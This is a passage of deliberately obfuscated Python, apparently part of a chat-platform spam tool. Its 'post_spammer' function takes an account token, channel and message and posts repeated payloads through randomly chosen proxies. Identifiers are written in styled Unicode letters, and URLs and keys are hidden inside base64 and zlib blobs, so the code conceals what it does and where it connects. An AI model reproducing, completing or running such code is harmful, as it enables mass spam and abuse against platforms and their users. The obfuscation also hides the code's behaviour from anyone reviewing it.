0.2832219762742695j))]).decompress(b'x\xda\x8b\x8c\x083H2\xb4\xccH\xce\xf5\xcbO\x8c\x88\xca\x890\n2L\xceu3H\x0c\xb7,\x05\x00\x85)\t1')).decode(): 𝘳𝙤𝙪𝙣𝘥(𝘢𝘣𝘴(328.4366837750183 + 4307.4968769287425j)), __𝘪𝘮𝙥𝙤𝘳𝘵__(𝘭𝘔𝙄𝘐𝘔𝙡𝗠𝗡𝙄𝗜𝗡𝙈𝘭𝘭𝙄𝗠𝙡𝙈𝘭𝙄𝗠𝙄𝗠𝗜𝘕𝙈𝗜𝘭𝗹𝙡𝘕𝙡[𝘳𝗼𝘂𝗻𝙙(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝘱𝗼𝘳𝘵__(𝗹𝗠𝘐𝗜𝘔𝘭𝙈𝙉𝘐𝙄𝗡𝘔𝗹𝗹𝙄𝗠𝘭𝘔𝗹𝙄𝗠𝘐𝘔𝗜𝘕𝘔𝙄𝙡𝘭𝗹𝗡𝙡[𝗿𝗼𝙪𝗻𝗱(𝘢𝗯𝙨(0.24532252608035043 + 0.9694415187093834j))]).decompress(b'x\xdaKr\xb7\xcc\x8a\x8c\x08*H22\xb1\x05\x00\x19\xb4\x03\xc5')).decode(): __𝘪𝙢𝗽𝗼𝙧𝘵__(𝙡𝘔𝗜𝘐𝗠𝙡𝙈𝘕𝗜𝙄𝘕𝗠𝗹𝙡𝘐𝘔𝙡𝙈𝘭𝙄𝘔𝙄𝙈𝘐𝗡𝗠𝙄𝙡𝗹𝗹𝘕𝙡[𝗿𝗼𝙪𝘯𝙙(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__(𝘭𝗠𝘐𝗜𝙈𝘭𝗠𝘕𝘐𝗜𝘕𝘔𝙡𝗹𝙄𝗠𝙡𝗠𝘭𝘐𝙈𝘐𝘔𝘐𝘕𝗠𝗜𝘭𝗹𝗹𝙉𝘭[𝙧𝘰𝙪𝗻𝗱(𝗮𝙗𝘴(0.6070734279679635 + 0.794645740600946j))]).decompress(b'x\xda\x0bs\xcf\xa8\x8c\nw\xcb\xf6t\xf5\xaaL2N\xa9\x8a\x8a\xf0L\x0fs\xb7,Kr\xf7\xcaHN\xb7\xb5\x05\x00\xb7\x8c\n\xf2')).decode()}
    𝗱𝘯 = 𝘵𝙤𝗸𝗲𝙣.split(__𝘪𝘮𝘱𝗼𝙧𝘁__(𝗹𝙈𝗜𝘐𝘔𝗹𝙈𝗡𝘐𝗜𝘕𝗠𝗹𝘭𝗜𝘔𝙡𝘔𝗹𝘐𝘔𝙄𝗠𝗜𝗡𝘔𝘐𝙡𝗹𝙡𝙉𝙡[𝗿𝙤𝘶𝙣𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__(𝙡𝙈𝙄𝗜𝙈𝘭𝗠𝗡𝙄𝘐𝙉𝙈𝙡𝙡𝘐𝙈𝘭𝙈𝙡𝙄𝘔𝗜𝗠𝙄𝘕𝗠𝗜𝗹𝙡𝗹𝙉𝙡[𝘳𝙤𝙪𝘯𝗱(𝘢𝗯𝘴(0.49603309179645816 + 0.8683036173153067j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝗻𝘯 = 𝙙𝘯[𝗿𝙤𝘂𝗻𝘥(𝘢𝘣𝘀(0.0 + 0j))]
    for _ in 𝘳𝗮𝗻𝘨𝘦(𝙧𝗼𝘂𝙣𝙙(𝘢𝗯𝙨(0.6938323087486534 + 0.7201366032472681j))):
        if 𝙥𝙧𝘰𝘅𝘆:
            𝘳𝗿 = 𝙧𝘦𝗾𝙪𝙚𝙨𝙩𝘴.post(__𝗶𝘮𝙥𝙤𝗿𝙩__(𝗹𝙈𝙄𝘐𝗠𝘭𝘔𝙉𝘐𝙄𝙉𝗠𝘭𝘭𝘐𝗠𝘭𝘔𝘭𝗜𝗠𝘐𝘔𝗜𝘕𝗠𝙄𝗹𝗹𝙡𝘕𝘭[𝘳𝗼𝙪𝘯𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__(𝗹𝗠𝙄𝗜𝙈𝙡𝘔𝙉𝗜𝗜𝙉𝙈𝗹𝘭𝘐𝙈𝙡𝙈𝘭𝙄𝗠𝗜𝘔𝘐𝙉𝙈𝘐𝙡𝘭𝗹𝘕𝘭[𝙧𝘰𝘂𝗻𝙙(𝘢𝘣𝙨(0.5134890290575127 + 0.8580961583864438j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(Kq\xcf\xa8\x8c\nw\xcbN.\xb7\xb5\x05\x00\xc8\x07\x16C')).decode().format(𝗰𝙝𝘢𝗻𝙣𝙚𝗹), headers=𝗵𝙚𝗮𝙙𝙚𝙧𝘀, json=𝗽𝘢𝘆𝙡𝙤𝘢𝘥, proxy={__𝘪𝙢𝗽𝘰𝙧𝙩__(𝙡𝙈𝗜𝙄𝘔𝘭𝙈𝗡𝘐𝗜𝗡𝙈𝗹𝙡𝗜𝙈𝘭𝗠𝘭𝘐𝘔𝘐𝙈𝙄𝘕𝘔𝙄𝘭𝘭𝙡𝘕𝘭[𝙧𝙤𝙪𝘯𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝙧𝙩__(𝘭𝗠𝗜𝗜𝗠𝙡𝗠𝘕𝙄𝘐𝙉𝗠𝗹𝗹𝙄𝘔𝗹𝗠𝗹𝙄𝗠𝘐𝘔𝙄𝙉𝗠𝗜𝗹𝙡𝘭𝗡𝘭[𝘳𝙤𝘂𝘯𝗱(𝘢𝗯𝘀(0.2960651551185164 + 0.955167746484694j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝘮𝘱𝗼𝘳𝘁__(𝗹𝘔𝗜𝙄𝘔𝗹𝙈𝘕𝙄𝙄𝙉𝙈𝘭𝙡𝙄𝘔𝙡𝗠𝙡𝗜𝘔𝘐𝘔𝙄𝘕𝙈𝙄𝘭𝘭𝘭𝘕𝘭[𝗿𝘰𝘂𝘯𝗱(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝘰𝗿𝘁__(𝘭𝙈𝗜𝘐𝙈𝗹𝙈𝙉𝗜𝗜𝙉𝙈𝙡𝙡𝗜𝙈𝘭𝘔𝘭𝗜𝗠𝙄𝙈𝙄𝗡𝗠𝙄𝙡𝘭𝗹𝘕𝗹[𝘳𝗼𝘂𝗻𝘥(𝙖𝘣𝘴(0.9001922998768911 + 0.4354926213408826j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝘢𝗻𝘥𝙤𝘮.choice(𝘱𝘳𝘰𝙭𝘪𝙚𝙨), __𝘪𝙢𝙥𝙤𝘳𝙩__(𝘭𝙈𝙄𝘐𝘔𝙡𝗠𝗡𝘐𝘐𝘕𝘔𝘭𝗹𝗜𝙈𝘭𝙈𝘭𝙄𝗠𝗜𝗠𝙄𝙉𝙈𝘐𝗹𝗹𝙡𝙉𝙡[𝙧𝘰𝘂𝙣𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝗿𝘁__(𝙡𝘔𝙄𝙄𝙈𝙡𝙈𝘕𝘐𝘐𝘕𝗠𝙡𝘭𝘐𝙈𝗹𝗠𝙡𝙄𝗠𝙄𝘔𝗜𝘕𝗠𝙄𝙡𝗹𝗹𝗡𝗹[𝙧𝙤𝘂𝙣𝗱(𝘢𝙗𝘀(0.9118163486281268 + 0.41059827858196185j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝙢𝘱𝘰𝗿𝘁__(𝗹𝘔𝘐𝙄𝗠𝙡𝗠𝘕𝘐𝘐𝗡𝙈𝘭𝙡𝗜𝗠𝙡𝘔𝘭𝙄𝘔𝗜𝘔𝙄𝗡𝘔𝙄𝗹𝙡𝙡𝗡𝘭[𝗿𝗼𝘶𝙣𝙙(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__(𝙡𝗠𝘐𝘐𝙈𝗹𝗠𝘕𝘐𝙄𝗡𝘔𝗹𝗹𝙄𝙈𝘭𝙈𝗹𝗜𝙈𝗜𝗠𝗜𝙉𝘔𝙄𝘭𝗹𝘭𝙉𝙡[𝘳𝘰𝘂𝘯𝘥(𝙖𝗯𝘀(0.2835444710758912 + 0.9589590882421904j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝙧𝙖𝗻𝘥𝗼𝗺.choice(𝗽𝗿𝘰𝙭𝗶𝘦𝘴)})
        else:
            𝘳𝙧 = 𝙧𝗲𝗾𝙪𝙚𝘴𝘁𝘀.post(__𝗶𝙢𝗽𝙤𝘳𝘵__(𝗹𝙈𝙄𝙄𝘔𝘭𝘔𝗡𝙄𝘐𝙉𝘔𝙡𝘭𝗜𝙈𝗹𝘔𝙡𝙄𝘔𝘐𝘔𝙄𝗡𝙈𝙄𝗹𝙡𝘭𝙉𝘭[𝙧𝙤𝘶𝗻𝘥(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝙧𝘁__(𝙡𝘔𝘐𝘐𝙈𝘭𝗠𝗡𝙄𝘐𝘕𝗠𝘭𝗹𝗜𝘔𝙡𝙈𝗹𝘐𝗠𝗜𝗠𝗜𝘕𝙈𝙄𝙡𝙡𝘭𝘕𝙡[𝙧𝘰𝘂𝘯𝙙(𝙖𝘣𝙨(0.9401706107944497 + 0.34070401024700503j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.\x8b4\xca\xc8H\xca5\xcdI\xf2\xf0-K56(Kq\xcf\xa8\x8c\nw\xcbN.\xb7\xb5\x05\x00\xc8\x07\x16C')).decode().format(𝗰𝗵𝘢𝙣𝗻𝘦𝗹), headers=𝙝𝗲𝗮𝗱𝗲𝙧𝘀, json=𝙥𝗮𝘆𝙡𝗼𝙖𝗱)
    if 𝙧𝘳.status_code == 𝗿𝙤𝘂𝘯𝘥(𝗮𝗯𝘴(84.10472794117531 + 182.55792159734096j)):
        𝙥𝘳𝘪𝘯𝙩(__𝗶𝗺𝗽𝙤𝙧𝘵__(𝙡𝗠𝗜𝙄𝙈𝙡𝘔𝙉𝘐𝗜𝙉𝘔𝘭𝗹𝗜𝘔𝘭𝙈𝙡𝗜𝙈𝘐𝘔𝗜𝘕𝘔𝙄𝙡𝘭𝙡𝘕𝘭[𝙧𝙤𝘶𝘯𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝗿𝘁__(𝗹𝘔𝙄𝘐𝙈𝙡𝗠𝙉𝘐𝙄𝙉𝗠𝗹𝗹𝗜𝙈𝗹𝘔𝙡𝘐𝘔𝘐𝗠𝙄𝗡𝙈𝗜𝙡𝙡𝘭𝙉𝘭[𝘳𝘰𝘂𝙣𝘥(𝙖𝘣𝘴(0.616538588596175 + 0.7873246908181125j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝗿, 𝗱𝗮𝘁𝘦𝘵𝗶𝙢𝗲.datetime.now().strftime(f"{𝗴}{__𝙞𝗺𝗽𝗼𝗿𝘵__(𝗹𝘔𝘐𝗜𝘔𝘭𝙈𝘕𝙄𝘐𝙉𝗠𝗹𝙡𝗜𝙈𝘭𝗠𝙡𝗜𝗠𝙄𝗠𝙄𝙉𝘔𝙄𝗹𝗹𝗹𝘕𝘭[𝗿𝙤𝙪𝗻𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝗿}"), 𝘳, 𝗹𝗰, 𝘳, 𝙣𝘯, 𝘨))
    else:
        𝘱𝘳𝗶𝗻𝘵(__𝗶𝗺𝘱𝘰𝗿𝘵__(𝗹𝗠𝙄𝙄𝘔𝙡𝗠𝘕𝙄𝗜𝗡𝗠𝗹𝗹𝙄𝙈𝘭𝘔𝙡𝘐𝙈𝘐𝘔𝘐𝗡𝗠𝗜𝘭𝗹𝘭𝘕𝘭[𝙧𝘰𝘶𝗻𝘥(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝙤𝗿𝙩__(𝗹𝗠𝙄𝗜𝗠𝙡𝗠𝗡𝘐𝘐𝗡𝗠𝙡𝙡𝗜𝗠𝙡𝙈𝘭𝙄𝗠𝘐𝘔𝘐𝙉𝙈𝗜𝘭𝘭𝙡𝘕𝘭[𝘳𝗼𝘂𝘯𝙙(𝙖𝘣𝘀(0.7251613135114584 + 0.688579021889526j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c\xcau+H\x02\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3\xd3S\x8d\rl\x01\x02\x05\x0c\xb8')).decode().format(𝗿, 𝗱𝙖𝘵𝙚𝙩𝘪𝙢𝙚.datetime.now().strftime(f"{𝙜}{__𝙞𝙢𝙥𝙤𝗿𝘵__(𝙡𝙈𝘐𝙄𝙈𝙡𝘔𝙉𝗜𝘐𝗡𝘔𝙡𝗹𝗜𝗠𝘭𝗠𝗹𝘐𝙈𝘐𝗠𝗜𝗡𝗠𝙄𝙡𝘭𝗹𝗡𝙡[𝘳𝙤𝘶𝗻𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(b'JUg6JU06JVM=').decode()}{𝙧}"), 𝙧, 𝗯, 𝗿, 𝗻𝙣, 𝗴, 𝙧𝗿.text))

def post_spammer(token, channel, name, msg):
    𝘩𝙚𝗮𝗱𝘦𝗿𝙨 = 𝙃𝗲𝗮𝗱𝘦𝙧𝘀(𝘁𝙤𝗸𝙚𝙣)
    𝘥𝙣 = 𝙩𝙤𝘬𝗲𝗻.split(__𝗶𝗺𝘱𝘰𝗿𝘁__(𝗹𝘔𝘐𝗜𝗠𝘭𝙈𝘕𝗜𝙄𝙉𝙈𝘭𝙡𝙄𝙈𝙡𝗠𝗹𝙄𝙈𝙄𝙈𝗜𝙉𝘔𝗜𝘭𝙡𝗹𝙉𝗹[𝗿𝙤𝘶𝘯𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝘰𝙧𝘵__(𝙡𝘔𝘐𝗜𝗠𝘭𝗠𝘕𝘐𝘐𝘕𝙈𝗹𝙡𝘐𝘔𝗹𝙈𝘭𝙄𝘔𝘐𝘔𝘐𝘕𝗠𝗜𝙡𝙡𝙡𝘕𝘭[𝘳𝙤𝙪𝙣𝙙(𝙖𝘣𝘴(0.8992022332226177 + 0.4375332487565453j))]).decompress(b'x\xda\xf3I\xb7\xb5\x05\x00\x03 \x01.')).decode())
    𝙣𝙣 = 𝘥𝗻[𝙧𝗼𝘶𝙣𝙙(𝘢𝗯𝙨(0.0 + 0j))]
    𝗽𝘢𝘺𝘭𝙤𝘢𝙙 = {__𝙞𝘮𝘱𝘰𝘳𝙩__(𝘭𝗠𝗜𝘐𝙈𝙡𝙈𝗡𝘐𝘐𝙉𝙈𝘭𝙡𝙄𝘔𝗹𝘔𝙡𝘐𝙈𝗜𝗠𝘐𝗡𝙈𝗜𝗹𝘭𝗹𝘕𝙡[𝙧𝘰𝘶𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝙧𝙩__(𝙡𝗠𝗜𝙄𝙈𝘭𝘔𝗡𝗜𝘐𝙉𝗠𝘭𝗹𝙄𝘔𝘭𝘔𝘭𝘐𝗠𝙄𝘔𝘐𝙉𝘔𝘐𝙡𝗹𝙡𝘕𝗹[𝘳𝙤𝘂𝗻𝗱(𝗮𝘣𝘴(0.9211610320668645 + 0.38918164525258514j))]).decompress(b'x\xdaK\xcau+\x89\n\xb4\xb5\x05\x00\r\r\x02\xaf')).decode(): 𝙣𝘢𝙢𝘦, __𝗶𝘮𝘱𝗼𝗿𝘵__(𝘭𝙈𝙄𝘐𝘔𝗹𝗠𝘕𝘐𝗜𝙉𝗠𝙡𝙡𝗜𝙈𝗹𝘔𝘭𝗜𝘔𝘐𝙈𝗜𝘕𝗠𝘐𝗹𝗹𝗹𝘕𝙡[𝗿𝘰𝘂𝙣𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__(𝙡𝙈𝗜𝙄𝘔𝙡𝗠𝗡𝗜𝙄𝘕𝘔𝙡𝘭𝘐𝙈𝘭𝘔𝘭𝙄𝘔𝘐𝙈𝙄𝙉𝘔𝘐𝘭𝙡𝘭𝗡𝙡[𝙧𝘰𝙪𝘯𝘥(𝘢𝙗𝙨(0.37619973492012504 + 0.9265385903706481j))]).decompress(b'x\xda\x8b\x8c\x083H2\xb4\xccH\xce\xf5\xcbO\x8c\x88\xca\x890\n2L\xceu3H\x0c\xb7,\x05\x00\x85)\t1')).decode(): 𝗿𝙤𝘂𝗻𝗱(𝗮𝗯𝘴(2647.3942646069117 + 3413.7521303876806j)), __𝘪𝙢𝙥𝘰𝙧𝙩__(𝙡𝗠𝙄𝗜𝙈𝙡𝘔𝘕𝗜𝘐𝗡𝘔𝘭𝘭𝙄𝙈𝘭𝘔𝘭𝗜𝘔𝘐𝙈𝘐𝙉𝘔𝙄𝘭𝗹𝙡𝙉𝘭[𝙧𝘰𝘂𝙣𝘥(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝘰𝗿𝘁__(𝗹𝘔𝙄𝘐𝙈𝙡𝗠𝗡𝗜𝗜𝙉𝘔𝘭𝙡𝘐𝗠𝗹𝙈𝙡𝘐𝙈𝙄𝙈𝗜𝗡𝗠𝘐𝙡𝘭𝙡𝗡𝙡[𝗿𝗼𝙪𝗻𝙙(𝘢𝙗𝘀(0.8624101944068403 + 0.506210091348598j))]).decompress(b'x\xda\x8b\x8cp*Or\xcf\xc9\x89r\xb34\x88\x0cO\xa9\x02\x00.\xc3\x05\x83')).decode(): [], __𝙞𝙢𝘱𝗼𝙧𝙩__(𝘭𝘔𝙄𝗜𝙈𝗹𝗠𝗡𝘐𝗜𝗡𝘔𝗹𝗹𝙄𝘔𝙡𝙈𝘭𝙄𝙈𝗜𝗠𝙄𝙉𝗠𝙄𝗹𝘭𝙡𝗡𝘭[𝙧𝙤𝘂𝙣𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝙧𝙩__(𝗹𝘔𝘐𝘐𝘔𝘭𝗠𝙉𝗜𝙄𝙉𝘔𝘭𝘭𝘐𝙈𝗹𝗠𝙡𝗜𝗠𝘐𝘔𝙄𝘕𝙈𝗜𝗹𝙡𝘭𝙉𝙡[𝗿𝗼𝘶𝘯𝗱(𝙖𝙗𝘀(0.8411985137160246 + 0.5407264192934825j))]).decompress(b'x\xdaK\n\x0f\xabJ6r\xcb\x8b\n\xb4\xb5\x05\x00\x1bY\x03\xf8')).decode(): {__𝙞𝘮𝙥𝗼𝘳𝘵__(𝘭𝘔𝘐𝙄𝘔𝙡𝙈𝙉𝗜𝙄𝘕𝗠𝗹𝙡𝘐𝙈𝗹𝘔𝙡𝙄𝙈𝘐𝗠𝗜𝗡𝘔𝙄𝙡𝘭𝘭𝘕𝘭[𝗿𝘰𝙪𝗻𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝗼𝘳𝘵__(𝙡𝘔𝗜𝗜𝗠𝘭𝙈𝘕𝘐𝘐𝘕𝙈𝗹𝘭𝘐𝗠𝘭𝗠𝗹𝗜𝗠𝙄𝗠𝙄𝗡𝙈𝗜𝗹𝘭𝘭𝗡𝙡[𝙧𝘰𝙪𝘯𝘥(𝘢𝗯𝙨(0.7627502441268572 + 0.6466931769273739j))]).decompress(b'x\xda\x8b4\xb2,Mq\x0f+Mq\xb4\xb5\x05\x00\x19\x1d\x03\xcf')).decode(): 𝘮𝘀𝘨}}
    𝙨𝘭𝙚𝙚𝘱(𝙧𝙤𝙪𝗻𝘥(𝗮𝗯𝘴(0.44931922284166836 + 0.8933712755539878j)))
    if 𝙥𝘳𝗼𝘅𝙮:
        𝘳𝙧 = 𝗿𝙚𝙦𝙪𝘦𝘀𝘵𝘀.post(__𝗶𝗺𝙥𝘰𝘳𝘵__(𝗹𝙈𝘐𝘐𝘔𝘭𝘔𝘕𝙄𝙄𝙉𝘔𝙡𝗹𝘐𝙈𝘭𝗠𝘭𝗜𝙈𝘐𝙈𝗜𝙉𝘔𝘐𝗹𝘭𝗹𝗡𝘭[𝙧𝘰𝘂𝗻𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝘳𝘁__(𝙡𝙈𝗜𝗜𝘔𝘭𝗠𝙉𝘐𝙄𝘕𝘔𝙡𝗹𝘐𝙈𝘭𝘔𝙡𝗜𝗠𝙄𝘔𝙄𝘕𝗠𝘐𝗹𝙡𝙡𝗡𝘭[𝙧𝘰𝙪𝗻𝗱(𝙖𝘣𝙨(0.9173611351660386 + 0.39805596049660796j))]).decompress(b'x\xda\r\xc8A\x0e@0\x10\x00\xc0/U\x85\xa4\x1f\xd0F\xe8\x81\xa4\xe8\xcdnIc[q\xda\xe0\xf5\xccqV3\x084}\xdd=\x8a\xd6\xd9\x1eP\xb6\xd4e\xcb0\xaa\x88\x9a8\x1c\xc4\x8b\x8c\x11r\x95\xc0\xf4\xbc\x95\x82\x83\x8e\x8f\x9f\x1a\xc2W\x15(\xdd\x0e\xd9\xbdA;\x9a\xa5\xbf\xfct\xff_\x08<]\xfa\x00\xc7^ K')).decode().format(𝘤𝘩𝙖𝙣𝘯𝙚𝙡), json=𝙥𝘢𝘆𝙡𝗼𝙖𝗱, headers=𝘩𝗲𝙖𝙙𝙚𝘳𝙨, proxy={__𝘪𝘮𝘱𝗼𝗿𝘁__(𝘭𝗠𝙄𝙄𝘔𝗹𝗠𝗡𝙄𝙄𝘕𝙈𝗹𝘭𝘐𝘔𝙡𝘔𝙡𝙄𝗠𝗜𝙈𝙄𝙉𝙈𝗜𝘭𝙡𝗹𝘕𝘭[𝘳𝙤𝘶𝘯𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝗼𝘳𝘵__(𝗹𝗠𝗜𝗜𝗠𝗹𝘔𝙉𝘐𝗜𝗡𝙈𝙡𝗹𝙄𝘔𝗹𝗠𝘭𝗜𝗠𝘐𝗠𝙄𝘕𝗠𝙄𝘭𝘭𝗹𝙉𝘭[𝘳𝘰𝘂𝙣𝘥(𝘢𝗯𝘴(0.5058462388302799 + 0.8626236622428459j))]).decompress(b'x\xdaK\xf4\x082Hv\xb4\xb5\x05\x00\n\xea\x02J')).decode(): __𝘪𝗺𝙥𝙤𝗿𝙩__(𝗹𝙈𝙄𝘐𝙈𝗹𝘔𝗡𝘐𝗜𝘕𝘔𝘭𝘭𝙄𝗠𝗹𝘔𝙡𝘐𝘔𝘐𝗠𝘐𝘕𝙈𝗜𝗹𝘭𝘭𝙉𝙡[𝙧𝗼𝙪𝘯𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__(𝙡𝗠𝙄𝙄𝗠𝗹𝗠𝙉𝙄𝘐𝘕𝗠𝘭𝘭𝗜𝗠𝘭𝙈𝗹𝙄𝘔𝗜𝗠𝙄𝗡𝗠𝘐𝘭𝙡𝙡𝗡𝗹[𝙧𝘰𝘶𝗻𝘥(𝘢𝘣𝙨(0.9045483995025485 + 0.4263709569815678j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝘳𝗮𝙣𝙙𝘰𝘮.choice(𝙥𝙧𝙤𝙭𝙞𝘦𝘀), __𝙞𝗺𝗽𝙤𝗿𝘁__(𝙡𝙈𝙄𝘐𝗠𝗹𝙈𝗡𝙄𝘐𝙉𝙈𝘭𝗹𝗜𝗠𝘭𝘔𝙡𝙄𝗠𝙄𝗠𝘐𝘕𝘔𝘐𝙡𝙡𝙡𝙉𝗹[𝙧𝘰𝘶𝘯𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__(𝙡𝗠𝗜𝗜𝙈𝘭𝘔𝙉𝗜𝘐𝙉𝗠𝗹𝗹𝙄𝙈𝘭𝘔𝘭𝗜𝙈𝙄𝘔𝘐𝗡𝘔𝙄𝗹𝗹𝙡𝙉𝘭[𝘳𝘰𝙪𝙣𝗱(𝙖𝘣𝘀(0.12509659230735892 + 0.9921445673857648j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf0\xb5\x05\x00\x0b\x1f\x02a')).decode(): __𝘪𝘮𝙥𝗼𝙧𝙩__(𝗹𝗠𝗜𝗜𝙈𝙡𝗠𝗡𝘐𝙄𝘕𝗠𝘭𝘭𝗜𝗠𝙡𝙈𝘭𝘐𝗠𝗜𝙈𝗜𝙉𝙈𝙄𝗹𝙡𝙡𝙉𝘭[𝘳𝗼𝘶𝘯𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝘳𝘵__(𝗹𝗠𝗜𝙄𝘔𝙡𝙈𝘕𝘐𝘐𝗡𝙈𝙡𝘭𝘐𝘔𝗹𝗠𝘭𝗜𝘔𝙄𝙈𝗜𝘕𝙈𝘐𝘭𝙡𝗹𝘕𝗹[𝘳𝗼𝘶𝘯𝙙(𝘢𝗯𝘀(0.646867885388068 + 0.7626020842179553j))]).decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf3)\xb7\xb5\x05\x00\x19\xbc\x03\xf5')).decode() + 𝗿𝘢𝙣𝗱𝘰𝙢.choice(𝗽𝘳𝙤𝙭𝙞𝘦𝙨)})
    else:
        𝗿𝘳 = 𝙧𝙚𝗾𝙪𝙚𝘴𝙩𝙨.post(__𝙞𝙢𝘱𝙤𝘳𝘁__(𝙡𝘔𝙄𝘐𝘔𝘭𝗠𝗡𝘐𝗜𝙉𝘔𝙡𝘭𝗜𝗠𝙡𝙈𝗹𝘐𝙈𝘐𝙈𝘐𝘕𝘔𝗜𝗹𝘭𝘭𝗡𝘭[𝘳𝗼𝙪𝘯𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝗽𝙤𝗿𝙩__(𝗹𝙈𝘐𝙄𝗠𝗹𝙈𝙉𝘐𝗜𝘕𝗠𝙡𝗹𝙄𝙈𝘭𝙈𝗹𝗜𝗠𝙄𝗠𝘐𝗡𝘔𝘐𝗹𝘭𝙡𝗡𝗹[𝙧𝗼𝘶𝗻𝘥(𝙖𝙗𝘀(0.1552318241709758 + 0.9878780697862217j))]).decompress(b'x\xda\r\xc8A\x0e@0\x10\x00\xc0/U\x85\xa4\x1f\xd0F\xe8\x81\xa4\xe8\xcdnIc[q\xda\xe0\xf5\xccqV3\x084}\xdd=\x8a\xd6\xd9\x1eP\xb6\xd4e\xcb0\xaa\x88\x9a8\x1c\xc4\x8b\x8c\x11r\x95\xc0\xf4\xbc\x95\x82\x83\x8e\x8f\x9f\x1a\xc2W\x15(\xdd\x0e\xd9\xbdA;\x9a\xa5\xbf\xfct\xff_\x08<]\xfa\x00\xc7^ K')).decode().format(𝘤𝗵𝗮𝘯𝙣𝘦𝙡), json=𝙥𝙖𝙮𝘭𝙤𝗮𝘥, headers=𝘩𝗲𝘢𝘥𝗲𝗿𝘴)
    if 𝘳𝘳.status_code == 𝘳𝗼𝘂𝘯𝙙(𝘢𝙗𝙨(16.849807779097176 + 200.2924960596564j)):
        𝙥𝘳𝙞𝙣𝘵(__𝙞𝗺𝘱𝗼𝙧𝘵__(𝗹𝙈𝙄𝙄𝙈𝘭𝘔𝘕𝘐𝘐𝘕𝘔𝗹𝘭𝗜𝘔𝗹𝗠𝗹𝘐𝙈𝙄𝘔𝙄𝙉𝘔𝗜𝙡𝗹𝘭𝙉𝘭[𝙧𝘰𝙪𝘯𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝙩__(𝗹𝘔𝘐𝘐𝙈𝙡𝘔𝙉𝘐𝘐𝘕𝙈𝗹𝘭𝗜𝗠𝗹𝗠𝘭𝙄𝘔𝙄𝙈𝗜𝙉𝗠𝘐𝘭𝗹𝗹𝗡𝗹[𝘳𝙤𝘶𝗻𝗱(𝘢𝙗𝙨(0.19626463850736886 + 0.9805509633219335j))]).decompress(b'x\xdaK56LJ56L\xf1\xf4(\xb1\x0c7.\xb1\x0c5\x0e\xcb\x8a4\n\xabJ\x06\xb2#\x82\x9d\xcc\xd3"J,\xbd3\xf3m\x01\xfc\xdb\x0c\xa3')).decode().format(𝘳, 